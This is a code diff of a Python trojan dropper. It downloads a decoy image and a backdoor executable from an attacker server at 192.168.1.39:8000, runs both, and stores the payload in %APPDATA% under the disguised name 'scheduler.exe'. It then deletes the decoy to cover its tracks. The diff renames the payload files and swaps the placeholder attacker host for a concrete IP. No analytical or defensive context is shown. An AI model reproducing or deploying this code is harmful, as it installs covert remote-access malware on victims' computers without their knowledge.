@@ -14,16 +14,17 @@ def download(url):
 temp_dir = tempfile.gettempdir()
 os.chdir(temp_dir)
 
-download('http://<attack-server>:8000/image.png')
+download('http://192.168.1.39:8000/image.png')
 subprocess.Popen('image.png',shell=True)
 #subprocess.Popen allows the following commands in the code to run as well
 
-location = os.environ["appdata"]+"\\Windows Explorer.exe"
+location = os.environ["appdata"]+"\\scheduler.exe"
 if not os.path.exists(location):
-    download('http://<attack-server>:8000/backdoor.exe')
-    subprocess.call('backdoor.exe',shell=True)
+    download('http://192.168.1.39:8000/client.exe')
+    subprocess.Popen('client.exe',shell=True)
 else:
     os.chdir(os.environ['appdata'])
-    subprocess.call('Windows Explorer.exe',shell=True)
+    subprocess.call('scheduler.exe',shell=True)
 
-os.remove('car.jpg')
+os.chdir(temp_dir)
+os.remove('image.png')
